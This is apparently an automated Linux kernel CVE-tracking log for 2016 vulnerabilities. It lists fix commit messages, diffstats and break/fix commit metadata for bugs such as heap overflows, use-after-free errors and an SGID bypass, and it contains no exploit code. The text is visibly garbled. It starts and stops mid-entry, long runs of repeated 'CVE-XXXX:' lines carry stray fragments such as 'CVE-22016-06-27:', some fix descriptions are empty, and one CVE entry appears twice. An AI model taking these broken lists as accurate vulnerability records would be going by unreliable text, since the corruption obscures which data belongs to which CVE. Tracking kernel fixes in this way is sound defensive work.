    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5828:
CVE-2016-5828:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5828:
CVE-2016-5828:
CVE-2016-5828:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Author: Cyril Bur <cyrilbur@gmail.com>
Date:   Fri Jun 17 14:58:34 2016 +1000

    powerpc/tm: Always reclaim in start_thread() for exec() class syscalls
    
    Userspace can quite legitimately perform an exec() syscall with a
    suspended transaction. exec() does not return to the old process, rather
    it load a new one and starts that, the expectation therefore is that the
    new process starts not in a transaction. Currently exec() is not treated
    any differently to any other syscall which creates problems.
    
    Firstly it could allow a new process to start with a suspended
    transaction for a binary that no longer exists. This means that the
    checkpointed state won't be valid and if the suspended transaction were
    ever to be resumed and subsequently aborted (a possibility which is
    exceedingly likely as exec()ing will likely doom the transaction) the
    new process will jump to invalid state.
    
    Secondly the incorrect attempt to keep the transactional state while
    still zeroing state for the new process creates at least two TM Bad
    Things. The first triggers on the rfid to return to userspace as
    start_thread() has given the new process a 'clean' MSR but the suspend
    will still be set in the hardware MSR. The second TM Bad Thing triggers
    in __switch_to() as the processor is still transactionally suspended but
    __switch_to() wants to zero the TM sprs for the new process.
    
    This is an example of the outcome of calling exec() with a suspended
    transaction. Note the first 700 is likely the first TM bad thing
    decsribed earlier only the kernel can't report it as we've loaded
    userspace registers. c000000000009980 is the rfid in
    fast_exception_return()
    
      Bad kernel stack pointer 3fffcfa1a370 at c000000000009980
      Oops: Bad kernel stack pointer, sig: 6 [#1]
      CPU: 0 PID: 2006 Comm: tm-execed Not tainted
      NIP: c000000000009980 LR: 0000000000000000 CTR: 0000000000000000
      REGS: c00000003ffefd40 TRAP: 0700   Not tainted
      MSR: 8000000300201031 <SF,ME,IR,DR,LE,TM[SE]>  CR: 00000000  XER: 00000000
      CFAR: c0000000000098b4 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 00003fffcfa1a370 0000000000000000 0000000000000000
      GPR04: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR08: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR12: 00003fff966611c0 0000000000000000 0000000000000000 0000000000000000
      NIP [c000000000009980] fast_exception_return+0xb0/0xb8
      LR [0000000000000000]           (null)
      Call Trace:
      Instruction dump:
      f84d0278 e9a100d8 7c7b03a6 e84101a0 7c4ff120 e8410170 7c5a03a6 e8010070
      e8410080 e8610088 e8810090 e8210078 <4c000024> 48000000 e8610178 88ed023b
    
      Kernel BUG at c000000000043e80 [verbose debug info unavailable]
      Unexpected TM Bad Thing exception at c000000000043e80 (msr 0x201033)
      Oops: Unrecoverable exception, sig: 6 [#2]
      CPU: 0 PID: 2006 Comm: tm-execed Tainted: G      D
      task: c0000000fbea6d80 ti: c00000003ffec000 task.ti: c0000000fb7ec000
      NIP: c000000000043e80 LR: c000000000015a24 CTR: 0000000000000000
      REGS: c00000003ffef7e0 TRAP: 0700   Tainted: G      D
      MSR: 8000000300201033 <SF,ME,IR,DR,RI,LE,TM[SE]>  CR: 28002828  XER: 00000000
      CFAR: c000000000015a20 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 c00000003ffefa60 c000000000db5500 c0000000fbead000
      GPR04: 8000000300001033 2222222222222222 2222222222222222 00000000ff160000
      GPR08: 0000000000000000 800000010000d033 c0000000fb7e3ea0 c00000000fe00004
      GPR12: 0000000000002200 c00000000fe00000 0000000000000000 0000000000000000
      GPR16: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR20: 0000000000000000 0000000000000000 c0000000fbea7410 00000000ff160000
      GPR24: c0000000ffe1f600 c0000000fbea8700 c0000000fbea8700 c0000000fbead000
      GPR28: c000000000e20198 c0000000fbea6d80 c0000000fbeab680 c0000000fbea6d80
      NIP [c000000000043e80] tm_restore_sprs+0xc/0x1c
      LR [c000000000015a24] __switch_to+0x1f4/0x420
      Call Trace:
      Instruction dump:
      7c800164 4e800020 7c0022a6 f80304a8 7c0222a6 f80304b0 7c0122a6 f80304b8
      4e800020 e80304a8 7c0023a6 e80304b0 <7c0223a6> e80304b8 7c0123a6 4e800020
    
    This fixes CVE-2016-5828.
    
    Fixes: bc2a9408fa65 ("powerpc: Hook in new transactional memory code")
    Cc: stable@vger.kernel.org # v3.9+
    Signed-off-by: Cyril Bur <cyrilbur@gmail.com>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/kernel/process.c |   10 ++++++++++
 1 file changed, 10 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5828
Break Date: 2013-02-15
Break Commit: bc2a9408fa65195288b41751016c36fd00a75a85
Break Tag: 3.9
Linus Fix Date: 2016-06-27
Linus Commit: 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: ff19f63ed47309550b47831ac39176d9910fadfe
Stable Tag: 3.14.74

CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 93a2001bdfd5376c3dc2158653034c20392d15c5
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Thu Jun 23 08:59:47 2016 -0600

    HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands
    
    This patch validates the num_values parameter from userland during the
    HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set
    to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter
    leading to a heap overflow.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Jiri Kosina <jkosina@suse.cz>

 drivers/hid/usbhid/hiddev.c |   10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5829
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-24
Linus Commit: 93a2001bdfd5376c3dc2158653034c20392d15c5
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 22e658d19a1a64512d49de2632ad2124e6f9e429
Stable Tag: 3.14.74

CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
CVE-2016-6130:
